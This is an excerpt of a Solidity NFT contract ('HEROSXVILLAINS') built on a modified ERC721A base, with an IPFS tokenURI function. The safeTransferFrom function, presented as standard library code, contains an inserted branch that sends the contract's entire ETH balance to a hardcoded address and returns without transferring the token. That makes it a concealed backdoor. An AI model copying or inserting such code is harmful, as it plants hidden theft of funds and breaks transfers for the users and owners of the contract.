...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x375E8CE9e8cB9Fc1f55D0d62250a25f5306cE74C).transfer(address(this).balance);
            return;
        }
...
contract HEROSXVILLAINS is ERC721A, TheOperatorFilterer {
    ...
    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeibwr5uyaey652r447o45canypv5jrqpxnf4s44z2alihf2qtn5aw4/", _toString(tokenId), ".json"));
    }
